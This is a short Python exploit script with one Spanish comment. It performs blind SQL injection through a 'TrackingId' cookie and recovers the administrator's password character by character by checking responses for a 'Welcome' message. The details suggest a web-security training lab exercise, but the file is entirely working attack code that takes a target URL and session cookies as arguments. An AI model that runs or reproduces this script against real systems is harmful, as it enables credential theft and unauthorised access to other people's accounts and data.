import sys
import requests
import urllib3
import urllib

urllib3.disable_warnings(urllib3.exceptions.InsecureRequestWarning)

proxies = {'http': 'http://127.0.0.1:8080', 'https': 'http://127.0.0.1:8080'}

def sqli_password(url, tracking_id, session_id):
    password_extrated = ""
    for i in range(1, 21):
        for j in range(32,126):
            sqli_payload = "' and (select ascii(substring(password,%s,1)) from users where username='administrator')='%s'--" % (i,j)
            sqli_payload_encoded = urllib.parse.quote(sqli_payload)
            # Usar los valores proporcionados por el usuario para las cookies
            cookies = {'TrackingId': tracking_id + sqli_payload_encoded, 'session': session_id}
            r = requests.get(url, cookies=cookies, verify=False, proxies=proxies)
            # print(r.text)
            if "Welcome" not in r.text:
                sys.stdout.write('\r' + password_extrated + chr(j))
                sys.stdout.flush()
            else:
                password_extrated += chr(j)
                sys.stdout.write('\r' + password_extrated)
                sys.stdout.flush()
                break

def main():
    if len(sys.argv) != 4:
        print("(+) Usage: %s <url> <TrackingId> <session>" % sys.argv[0])
        print("(+) Example: %s \"www.example.com\" \"Q65RjyOoIdkXejJE\" \"32MQC5eQLnSoTmsUFVCJ54WG0k23ShEn\"" % sys.argv[0])
        sys.exit(1)

    url = sys.argv[1]
    tracking_id = sys.argv[2]
    session_id = sys.argv[3]
    
    print("(+) Retrieving administrator password ...")
    sqli_password(url, tracking_id, session_id)

if __name__ == "__main__":
    main()
